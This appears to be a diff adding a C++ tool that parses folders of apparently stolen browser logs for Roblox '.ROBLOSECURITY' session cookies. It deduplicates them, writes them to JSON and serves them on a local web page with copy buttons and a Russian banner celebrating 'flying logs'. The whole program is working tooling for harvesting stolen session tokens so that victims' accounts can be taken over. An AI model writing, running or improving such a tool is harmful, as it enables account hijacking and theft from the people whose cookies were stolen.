@@ -1,0 +1,931 @@
+#include <filesystem>
+#include <thread>
+#include <iostream>
+#include <winsock2.h>
+#include <shellapi.h>
+#include <Windows.h>
+#include <fstream>
+#include <vector>
+#include <future>
+#include <string>
+#include <sstream>
+#include <syncstream>
+#include "httplib.h"
+#include <algorithm>
+#include <unordered_set>
+
+#define JSON
+#define REPEATATOR
+//#define TXT
+
+namespace fs = std::filesystem;
+std::mutex m;
+const fs::path DIRECTORY_ENTRY = fs::current_path(); 
+const std::vector<std::string> BROWSERS{"Opera", "Chrome", "Chromium", "Edge", "Firefox", "Opera Air", "Opera GX", "Vivaldi", "Yandex", "Roblox"};
+std::unordered_set<std::string> cookies;
+size_t countOfFound = 0;
+
+void parseKnownBrowsers(const fs::path p, std::ofstream& out) {
+    std::vector<std::future<BOOL>> futures;
+    for (auto& b : BROWSERS) {
+        if (fs::path bDir = p / b; fs::exists(bDir)) {
+            futures.emplace_back(std::async(std::launch::async, [b, bDir, &out]() {
+                for (fs::recursive_directory_iterator it(bDir), end; it != end; ++it) {
+                    const fs::directory_entry& entry = *it;
+                    if (entry.path().extension() == ".txt") {
+                        std::fstream reader(entry.path(), std::ios::in);
+                        if (reader.is_open()) {
+                            std::string line;
+                            BOOL isFound = FALSE;
+                            while (std::getline(reader, line)) {
+                                std::istringstream iss(line);
+                                std::string word;
+                                while (iss >> word) {
+                                    if (word == ".ROBLOSECURITY") {
+                                        iss >> word;
+
+#ifdef REPEATATOR
+                                        if (!cookies.contains(word)) {
+                                            cookies.emplace(word);
+#else
+                                        {
+#endif
+                                            isFound = TRUE;
+                                            std::string temp = b;
+                                            std::transform(temp.begin(), temp.end(), temp.begin(), [](unsigned char c){return toupper(c);});
+
+                                            std::unique_lock<std::mutex> lk(m);
+                                            countOfFound++;
+
+                                            std::string filename = entry.path().filename().string();
+                                            auto pos = filename.find('.');
+                                            if (pos != std::string::npos)
+                                                filename.erase(filename.begin() + pos, filename.end());
+
+#ifdef TXT
+                                            out << temp << ' ' << '[' << filename << ']' << '\n' << word << "\n\n";
+#endif
+
+#ifdef JSON
+                                            std::string parent = entry.path().parent_path().filename().string();
+                                            auto ppos = parent.find('.');
+                                            if (ppos != std::string::npos)
+                                                parent.erase(parent.begin() + ppos, parent.end());
+
+                                            out << "{\n\t\"browser\": \"" << parent << ' ' << '[' << filename << ']'
+                                                << "\",\n\t\"cookie\": \"" << word << "\"\n},\n";
+#endif
+#ifdef REPEATATOR
+                                        } else {
+                                            std::osyncstream(std::cout) << "Repeated cookie was found - skip!\n";
+                                            return FALSE;
+                                        }
+#endif
+                                    }
+                                }
+                            }
+                            if (!isFound) {
+                                std::osyncstream(std::cout) << entry.path() << " didn't find any .ROBLOSECURITY!\n";
+                                return FALSE;
+                            } else {
+                                std::osyncstream(std::cout) << entry.path() << " have been written!\n";
+                            }
+                        } else {
+                            std::osyncstream(std::cout) << entry.path() << " file doesn't open!\n";
+                            return FALSE;
+                        }
+                    }
+                }
+                return TRUE;
+            }));
+        }
+    }
+    for (auto& f : futures) f.get();
+}
+
+void UnknownBrowsersAndPackages(const fs::path p, std::ofstream& out) {
+    const fs::path packages = p / "Packages";
+    const fs::path unknownBS = p / "Unknown Browsers";
+    std::vector<std::future<BOOL>> futures;
+
+    auto processEntry = [&](const fs::directory_entry& entry) {
+        std::fstream reader(entry.path(), std::ios::in);
+        if (!reader.is_open()) {
+            std::osyncstream(std::cout) << entry.path() << " doesn't open!\n";
+            return FALSE;
+        }
+
+        std::string line;
+        BOOL isFound = FALSE;
+        while (getline(reader, line)) {
+            std::istringstream iss(line);
+            std::string word;
+            while (iss >> word) {
+                if (word == ".ROBLOSECURITY") {
+                    iss >> word;
+
+#ifdef REPEATATOR
+                    if (!cookies.contains(word)) {
+                        cookies.emplace(word);
+#else
+                    {
+#endif
+                        isFound = TRUE;
+
+                        std::unique_lock<std::mutex> lk(m);
+                        countOfFound++;
+
+                        std::string filename = entry.path().filename().string();
+                        auto pos = filename.find('.');
+                        if (pos != std::string::npos)
+                            filename.erase(filename.begin() + pos, filename.end());
+
+                        std::string parent = entry.path().parent_path().filename().string();
+                        auto ppos = parent.find('.');
+                        if (ppos != std::string::npos)
+                            parent.erase(parent.begin() + ppos, parent.end());
+
+#ifdef TXT
+                        out << entry.path().parent_path().filename().string() << ' ' << '[' << filename << ']' << '\n' << word << "\n\n";
+#endif
+
+#ifdef JSON
+                        out << "{\n\t\"browser\": \"" << parent << ' ' << '[' << filename << ']'
+                            << "\",\n\t\"cookie\": \"" << word << "\"\n},\n";
+#endif
+#ifdef REPEATATOR
+                    } else {
+                        std::osyncstream(std::cout) << "Repeated cookie was found - skip!\n";
+                        return FALSE;
+                    }
+#endif
+                }
+            }
+        }
+
+        if (isFound)
+            std::osyncstream(std::cout) << entry.path() << " have been written!\n";
+        else
+            std::osyncstream(std::cout) << "Cookie wasn't found at " << entry.path() << '\n';
+        return TRUE;
+    };
+
+    for (auto& entry : fs::recursive_directory_iterator(packages)) {
+        if (entry.path().extension() == ".txt") {
+            futures.emplace_back(std::async(std::launch::async, [entry, &processEntry]() {
+                return processEntry(entry);
+            }));
+        }
+    }
+
+    for (auto& entry : fs::recursive_directory_iterator(unknownBS)) {
+        if (entry.path().extension() == ".txt") {
+            futures.emplace_back(std::async(std::launch::async, [entry, &processEntry]() {
+                return processEntry(entry);
+            }));
+        }
+    }
+
+    for (auto& f : futures) f.get();
+}
+
+
+BOOL htmlOpen() {
+    const char* HTML_CODE = R"HTML(
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Bowlby+One+SC&display=swap');
+    @import url('https://fonts.googleapis.com/css2?family=Bebas+Neue&display=swap');
+    @import url('https://fonts.googleapis.com/css2?family=Barlow+Condensed:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap');
+    body {
+        font-family: Impact, Haettenschweiler, 'Arial Narrow Bold', sans-serif;
+        background-color: violet;
+        background-image: url('/resources/back.png');
+        background-size: cover;
+    }
+    .centered {
+        font-family: 'Bowlby One SC', sans-serif;
+        text-align: center;
+        font-size: 47px;
+        margin-bottom: 5px;
+        color:black;
+        user-select: none;
+    }
+    .item {
+        /*margin: 10px auto; */
+        position: relative;
+        padding: 10px;
+        border: 2px solid white;
+        width: 1870px;
+        border-radius: 5px;
+        margin-bottom: 10px;
+    }
+    .cookie-box {
+        max-height: 40px;
+        max-width: 1865px; /* или любое значение, которое тебе нужно */
+        width: 1865px;
+        overflow-x: auto; /* вертикальный скролл при переполнении */
+        overflow-y: hidden;
+        white-space: nowrap;
+        background-color: #f0f0f0; /* для визуального отделения */
+        padding: 5px;
+        border-radius: 3px;
+        margin-bottom: 15px;
+        font-size: 14px; /* если нужно */
+    }
+    .red-button {
+        height: 50px;
+        width: 50px;
+        background-color: red;
+        background-image: url('/resources/copy.png');
+        cursor: pointer;
+        align-items: center;
+        border-radius: 5px;
+        justify-content: center;
+        text-align: center;
+        display: flex;
+        color: black;
+        position: absolute;
+        top: 10px;
+        right: 10px;
+        font-size: 20px;
+        user-select: none;
+        animation: lifted 0.3s ease forwards;
+    }
+    .red-button.active {
+        animation: clicked 0.2s ease forwards;
+    }
+    @keyframes clicked {
+        to {
+            transform: scale(0.8);
+        }
+    }
+    @keyframes lifted {
+        from {
+            transform: scale(0.8);
+        }
+        to {
+            transform: scale(1);
+        }
+    }
+    .text-copied {
+        text-align: center;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        color:rgb(0, 0, 0);
+        font-size: 100px;
+        position: fixed;
+        justify-content: center;
+        align-items: center;
+        display: none;
+        user-select: none;
+        z-index: 999999;
+    }
+    .cookie-box-style {
+        font-family: 'Bebas Neue', sans-serif;
+        font-weight: 400; /* или 700 для bold */
+        font-size: 20px;
+        color: black;
+        user-select: none;
+    }
+    .prince {
+        width: 650px;
+        height: 650px;
+        background-image: url('/resources/temniyprinc.png');
+        position: fixed;
+        align-items: center;
+        justify-content: center;
+        transform: translate(-50%, -50%);
+        top: 50%;
+        left: 50%;
+        z-index: 99999;
+        display: none;
+    }
+    .prince-back {
+        position: fixed;
+        width: 100vw;
+        height: 100vw;
+        background-color: black;
+        display: none;
+        z-index: 9999;
+        top: 0;
+        left: 0;
+    }
+    @keyframes blink {
+        0% {color: black; }
+        50% {color: white; }
+        100% {color: black; }
+    }
+    .blinking {
+        animation: blink 0.2s infinite linear;
+    }
+    @font-face {
+        font-family: 'Sigmar';
+        src: url('/resources/sigmarcyrillic.otf') format('opentype'),
+        url('/resources/1.otf') format('opentype');
+        font-weight: normal;
+        font-style: normal;
+        unicode-range: U+0400-04FF;
+    }
+
+    .left-block {
+        position: fixed;
+        top: 20%;         /* верхняя граница области */
+        left: 10%;        /* левая граница области */
+        width: 300px;     /* ширина области */
+        height: 400px;    /* высота области */
+        display: none;
+        flex-direction: column;
+        justify-content: center; /* по вертикали */
+        align-items: center;     /* по горизонтали */
+        color: white;
+        font-family: 'Sigmar', sans-serif;
+        font-size: 100px;
+        user-select: none;
+        z-index: 50111;
+    }
+
+    .left-block span {
+        opacity: 0;
+        transform: translateY(10px);
+        animation: fadeIn 0.35s ease forwards;
+    }
+
+    .left-block span:nth-child(1) { animation-delay: 0.25s; }
+    .left-block span:nth-child(2) { animation-delay: 0.75s; }
+
+
+    @keyframes fadeIn {
+        to {
+            opacity: 1;
+            transform: translateY(0);
+        }
+    }
+
+    .right-block {
+        position: fixed;
+        top: 40%;
+        left: 75.5%;        /* где начинается правая область */
+        width: 300px;
+        height: 100px;
+        display: none;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        color: white;
+        font-family: 'Sigmar', sans-serif;
+        font-size: 100px;
+        user-select: none;
+        z-index: 50111;
+    }
+
+    .right-block span {
+        opacity: 0;
+        transform: translateY(10px);
+        animation: fadeIn 0.25s ease forwards;
+    }
+
+    .right-block span:nth-child(1) { animation-delay: 1.25s; }
+    .right-block span:nth-child(2) { animation-delay: 1.65s; }
+    .right-block span:nth-child(3) { animation-delay: 2.35s; }
+    .right-block span:nth-child(4) { animation-delay: 2.85s; }
+    .right-block span:nth-child(5) { animation-delay: 3.40s; }
+
+    .play-track-button {
+        position: fixed;
+        align-items: center;
+        justify-content: center;
+        top: 91%;
+        left: 50%;
+        transform: translateX(-50%);
+        z-index: 99999999;
+        width: 450px;
+        height: 75px;
+        border: 4px solid transparent;
+        border-radius: 50px;
+        overflow: hidden; /* чтобы псевдоэлемент не вылезал */
+    }
+    .play-track-button::before {
+        content: "";
+        position: absolute;
+        inset: 0;
+        background:
+                url("/resources/playbutton.png") center/cover no-repeat padding-box,
+                linear-gradient(violet, violet) padding-box,
+                linear-gradient(90deg, red, orange, yellow, lime, cyan, blue, violet) border-box;
+        background-origin: border-box;
+        background-clip: padding-box, border-box;
+        background-size: 100% 100%, 300% 100%;
+        animation: borderMove 4s linear infinite;
+        opacity: 0.75; /* нужная прозрачность */
+        z-index: -1; /* чтобы не закрывать span */
+    }
+    @keyframes borderMove {
+        from {
+            background-position: 0 0, 0% 0;
+        }
+        to {
+            background-position: 0 0, 100% 0;
+        }
+    }
+
+    .play-button {
+        align-items: center;
+        justify-content: center;
+        width: 64px;
+        height: 64px;
+        position: fixed;
+        opacity: 100%;
+        left: 50%;
+        top: 7%;
+        transform: translateX(-50%) scale(1);
+        background-image: url("/resources/64.png");
+        z-index: 999999999;
+        cursor: pointer;
+        animation: Appear 0.15s ease forwards;
+        animation: jumpdown 0.20s ease forwards;
+    }
+    .pause-button {
+        align-items: center;
+        justify-content: center;
+        width: 64px;
+        height: 64px;
+        position: fixed;
+        opacity: 100%;
+        left: 50%;
+        top: 7%;
+        transform: translateX(-50%) scale(0) translateY(0);
+        background-image: url("/resources/pause.png");
+        z-index: 999999999;
+        cursor: pointer;
+        display: none;
+        animation: Disappear 0.15s ease forwards;
+    }
+    .pause-button.active {
+        display: flex;
+        animation: Appear 0.15s ease forwards;
+        animation: jumpbutton 0.20s ease forwards;
+    }
+    .play-button.active {
+        display: none;
+        animation: Disappear 0.15s ease forwards;
+    }
+    @keyframes Disappear {
+        from {
+            transform: translateX(-50%) scale(1);
+        }
+        to {
+            transform: translateX(-50%) scale(0);
+        }
+    }
+    @keyframes Appear {
+        from {
+            transform: translateX(-50%) scale(0);
+        }
+        to {
+            transform: translateX(-50%) scale(1);
+        }
+    }
+    @keyframes jumpbutton {
+        from {
+            transform: translateX(-50%) scale(1) translateY(0);
+        }
+        to {
+            transform: translateX(-50%) scale(1) translateY(-10%);
+        }
+    }
+    @keyframes jumpdown {
+        from {
+            transform: translateX(-50%) scale(1) translateY(-10%);
+        }
+        to {
+            transform: translateX(-50%) scale(1) translateY(0);
+        }
+    }
+
+    .playback-line {
+        width: 400px;
+        height: 8px;
+        background: white;
+        position: fixed;
+        transform: translateX(-50%) scaleX(0);
+        transform-origin: center;
+        left: 50%;
+        top: 82%;
+        border-radius: 6px;
+        display: flex;
+        opacity: 0;
+        animation: lineDisapper 0.3s ease forwards;
+    }
+    .playback-line.active {
+        opacity: 1;
+        animation: lineAppear 0.2s ease forwards;
+    }
+    .circle {
+        width: 12.5px;
+        height: 12.5px;
+        border-radius: 6.25px;
+        position: fixed;
+        transform: translateX(-50%) scale(0);
+        left: 7%;
+        top: 80%;
+        background: white;
+        z-index: 999999999;
+        opacity: 0;
+        animation: circleDisAppear 0.3s ease forwards;
+    }
+
+    .circle.active {
+        opacity: 1;
+        transform: translateX(-50%) scale(1);
+        animation: circleAppear 0.25s ease forwards,
+                   moveCircle 0.1s linear forwards;
+        animation-play-state: running;
+    }
+    .circle.opacitychange {
+        opacity: 0;
+        transform: translateX(-50%) scale(1);
+        animation:
+                circleAppear 0.25s ease forwards,
+                moveCircle 0.1s linear forwards,
+                CircleOpacityChange 0.2s ease forwards ;
+    }
+    @keyframes CircleOpacityChange {
+        from {
+            opacity: 1;
+            transform: translateX(-50%) scale(1);
+        }
+        to {
+            opacity: 0;
+            transform: translateX(-50%) scale(1);
+        }
+    }
+    @keyframes moveCircle {
+        from {
+            left: 7%;
+            opacity: 1;
+            transform: translateX(-50%) scale(1);
+        }
+        to {
+            left: 94%;
+            opacity: 1;
+            transform: translateX(-50%) scale(1);
+        }
+    }
+    @keyframes circleAppear {
+        from {
+            transform: translateX(-50%) scale(0);
+        }
+        to {
+            transform: translateX(-50%) scale(1);
+        }
+    }
+    @keyframes circleDisAppear {
+        from {
+            transform: translateX(-50%) scale(1);
+        }
+        to {
+            transform: translateX(-50%) scale(0);
+        }
+    }
+    @keyframes lineAppear  {
+        from {
+            opacity: 0;
+            transform: translateX(-50%) scaleX(0);
+        }
+        to {
+            opacity: 1;
+            transform: translateX(-50%) scaleX(1);
+        }
+    }
+    @keyframes lineDisapper {
+        from {
+            opacity: 1;
+            transform: translateX(-50%) scaleX(1);
+        }
+        to {
+            opacity: 0;
+            transform: translateX(-50%) scaleX(0);
+        }
+    }
+.blackscreen {
+    width: 100vw;
+    height: 100vw;
+    background: black;
+    opacity: 1;
+    position: fixed;
+    top: 0;
+    left: 0;
+    z-index: 9999999999999999999;
+    animation: fadeOut 3s ease forwards;
+}
+@keyframes fadeOut {
+ to {
+     opacity: 0;
+ }
+}
+</style>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+         <title>
+        Parser Results
+       </title>
+    </head>
+
+    <body>
+        <span class="blackscreen"></span>
+        <script>
+            async function waitForBlackScreen(screen) {
+                return new Promise(resolve => {
+                   screen.addEventListener('animationend', resolve, {once:true});
+                });
+            }
+            const blackscreen = document.querySelector('.blackscreen');
+
+
+            (async () => {
+                await waitForBlackScreen(blackscreen);
+                blackscreen.remove(); // полное удаление из DOM
+            })();
+        </script>
+
+
+        <div class="left-block">
+        <span>ТЁМНЫЙ</span>
+        <span>ПРИНЦ</span>
+        </div>
+
+        <div class="right-block">
+        <span>ПОКА</span>
+        <span>ПАПА</span>
+        <span>РАБОТАЛ</span>
+        <span>ЛЕТЕЛИ</span>
+        <span>ЛОГИ</span>
+        </div>
+
+        <div class="centered">Parser Results <br>
+        <div class="prince"></div>
+        <span id="counter"></span>
+        </div>
+        <div id="container"></div>
+        <div class ="prince-back"></div>
+        <div class="text-copied">Cookie copied!</div>
+
+        <script>
+            const audio = new Audio('/resources/untitled.mp3');
+            fetch('output.json')
+                .then(res => res.json())
+                .then(data => {
+                    data.sort((a,b) => {
+                       if (a.browser < b.browser) return -1;
+                       if (a.browser > b.browser) return 1;
+                       return 0;
+                    });
+                    const container = document.getElementById('container');
+                    const counter = document.getElementById('counter');
+
+                    counter.textContent = `Cookies amount: ${data.length}`;
+                    data.forEach(item => {
+
+                        const div = document.createElement('div');
+                        div.className = 'item';
+
+                        const redButton = document.createElement('span');
+                        redButton.className = "red-button";
+                        redButton.textContent = `COPY`;
+                        redButton.onclick = () => onCopyTextbuttonCopyButton(item.cookie, redButton);
+
+                        const spanBrowser = document.createElement('span');
+                        spanBrowser.style.fontFamily = "'Barlow Condensed', sans-serif";
+                        spanBrowser.style.fontWeight = "300";
+                        spanBrowser.style.fontStyle = "Italic";
+                        spanBrowser.style.userSelect = 'none';
+                        spanBrowser.style.fontSize = '30px';
+                        spanBrowser.textContent = `Browser: ${item.browser}\n`;
+
+
+                        const spanCookie = document.createElement('span');
+                        spanCookie.className = 'cookie-box-style';
+                        spanCookie.style.display = 'block';
+                        spanCookie.textContent = ` Cookie: `;
+
+                        const cookieBox = document.createElement('div');
+                        cookieBox.className = 'cookie-box';
+                        cookieBox.textContent = item.cookie;
+
+                        div.appendChild(spanBrowser);
+                        div.appendChild(spanCookie);
+                        div.appendChild(cookieBox);
+                        div.appendChild(redButton);
+                        container.appendChild(div);
+                    });
+                });
+
+            function waitForEnd(audio) {
+                return new Promise(resolve => {
+                    audio.addEventListener('ended', resolve, {once:true});
+                });
+            }
+
+            async function run() {
+                await audio.play();
+                await waitForEnd(audio);
+            }
+            async function waitforanimation(el) {
+                return new Promise(resolve => {
+                    el.addEventListener('animationend', resolve, {once:true});
+                });
+            }
+            async function onCopyTextbuttonCopyButton(text, button) {
+                await navigator.clipboard.writeText(text);
+                const hub = new Audio('/resources/click.mp3')
+                hub.play();
+                button.classList.add('active');
+                    await waitforanimation(button);
+                    button.classList.remove('active');
+                    await waitForEnd(hub);
+
+                    const copiedText = document.querySelector('.text-copied');
+                    const backgroundPrince = document.querySelector('.prince-back')
+                    const princeIMG = document.querySelector('.prince');
+                    const leftblock = document.querySelector('.left-block');
+                    const rightblock = document.querySelector('.right-block');
+                    const playButton = document.querySelector('.play-track-button');
+
+
+                    playButton.style.display = 'none';
+                    copiedText.style.display = 'flex';
+                    backgroundPrince.style.display = 'flex';
+                    princeIMG.style.display = 'flex';
+                    leftblock.style.display = 'flex';
+                    rightblock.style.display = 'flex';
+                    copiedText.classList.add('blinking');
+                    await run();
+                    copiedText.classList.remove('blinking')
+                    copiedText.style.display = 'none';
+                    rightblock.style.display = 'none';
+                    leftblock.style.display = 'none';
+                    princeIMG.style.display = 'none';
+                    backgroundPrince.style.display = 'none';
+                    playButton.style.display = 'flex';
+
+            };
+        </script>
+        <div class="play-track-button">
+        <span class="play-button"></span>
+        <span class="pause-button"></span>
+        <span class="playback-line"></span>
+        <span class="circle"></span>
+        </div>
+
+        <script>
+            let circleMoving = false;
+            let numOfSongs = 3;
+            let num = Math.floor(Math.random() * numOfSongs + 1);
+            const songs = [];
+            for (let i = 0; i <= 3; i++) {
+                songs.push(`/resources/songs/${i}.mp3`);
+            }
+            const audio2 = new Audio(songs[num]);
+
+            const playButton = document.querySelector('.play-button');
+            const pauseButton = document.querySelector('.pause-button');
+            const playbackLine = document.querySelector('.playback-line');
+            const playbackCircle = document.querySelector('.circle');
+            playButton.onclick = () => playAudio();
+            pauseButton.onclick = () => pauseAudio();
+
+
+            async function waitForAnimationEnd(el) {
+                return new Promise(resolve => {
+                    el.addEventListener('animationend', resolve, {once:true});
+                });
+            }
+
+            async function waitForMetadata(audio) {
+                return new Promise(resolve => {
+                   if (audio.readyState >= 1) {
+                       resolve();
+                   }
+                   else {
+                       audio.addEventListener('loadedmetadata', resolve, {once:true});
+                       }
+                });
+            }
+            async function playAudio() {
+                if (circleMoving == false) {
+                     await waitForMetadata(audio2);
+                    playbackCircle.style.animationDuration = audio2.duration + 's';
+                }
+                await audio2.play();
+
+                playButton.classList.add('active');
+                pauseButton.classList.add('active');
+
+                if (circleMoving == false) {
+                    playbackLine.classList.add('active');
+                }
+                await waitForAnimationEnd(playbackLine);
+                if (playbackCircle.style.animationPlayState  == 'paused') {
+                    playbackCircle.style.animationPlayState  = 'running';
+                }
+                if (circleMoving == false) {
+                    playbackCircle.classList.add('active');
+                    circleMoving = true;
+                }
+            }
+            function pauseAudio() {
+                audio2.pause();
+                if (circleMoving == true) {
+                    playbackCircle.style.animationPlayState = 'paused';
+                }
+                pauseButton.style.animationPlayState = 'paused';
+                pauseButton.classList.remove('active');
+                playButton.classList.remove('active');
+                if (circleMoving == false) {
+                    playbackLine.classList.remove('active');
+                }
+            }
+        </script>
+    </body>
+</html>
+    )HTML";
+    std::ofstream writer(DIRECTORY_ENTRY / "page.html");
+    if (!writer.is_open()) {std::cout << "File doesn't open!\n"; return FALSE;}
+
+    writer << HTML_CODE;
+    writer.close();
+
+    httplib::Server sv;
+    sv.set_mount_point("/resources", "./resources");
+    sv.Get("/hi", [](const httplib::Request& req, httplib::Response& res){
+        res.set_content("Hello world!", "text/plain");
+    });
+
+    sv.Get("/", [](const httplib::Request& req, httplib::Response& res){
+        std::ifstream reader("page.html");
+        std::stringstream buffer;
+        buffer << reader.rdbuf();
+        res.set_content(buffer.str(), "text/html");
+    });
+
+    sv.Get("/output.json", [](const httplib::Request& req, httplib::Response& res){
+        std::ifstream reader("output.json");
+        std::stringstream buffer;
+        buffer << reader.rdbuf();
+        res.set_content(buffer.str(), "application/json");
+    });
+
+
+    ShellExecuteA(NULL, "open", "http://localhost:8080", NULL, NULL, SW_SHOWNORMAL);
+    std::cout << "Page has been opened!\nCtrl + C to stop hosting server!\nHaveFUN!!!\n";
+
+    std::cout << "Server Listening on http://localhost:8080\n";
+    sv.listen("0.0.0.0", 8080);
+    return TRUE;
+};
+
+void startParser(const fs::path p) {
+#ifdef TXT
+    std::cout << "TXT Mode has been choosen!\n";
+    std::ofstream outputDir(DIRECTORY_ENTRY / "output.txt");
+#endif
+
+#ifdef JSON 
+    std::cout << "JSON Mode has been choosen!\nHTML page available!\n";
+    std::ofstream outputDir(DIRECTORY_ENTRY / "output.json");
+#endif
+    if (!outputDir.is_open()) {std::cout << "outputDir doesn't open\n"; return;}
+#ifdef JSON
+    outputDir << "[\n";
+#endif
+
+    parseKnownBrowsers(p, outputDir);
+    UnknownBrowsersAndPackages(p, outputDir);
+    std::cout << countOfFound << " cookies were found!\n";
+#ifdef JSON
+    outputDir.seekp(-3, std::ios::cur);
+    outputDir << " ";
+    outputDir.seekp(0, std::ios::end);
+    outputDir << "]";
+    outputDir.close();
+    std::cout << "] have been written!\n";
+
+
+
+    if (htmlOpen()) {std::cout << "HTML opened!\n";}
+    #endif
+}
+
+int main(int argc, char* argv[]) {
+    if (argc != 2) {
+        std::cout << "Please enter: prog.exe [path to logs folder]\n";
+        exit(0);
+    }
+    const fs::path path = argv[1]; 
+    std::cout << "Path choosen -> " << path << '\n';
+    std::cout << "Parsing started...\n";
+
+    startParser(path);
+}
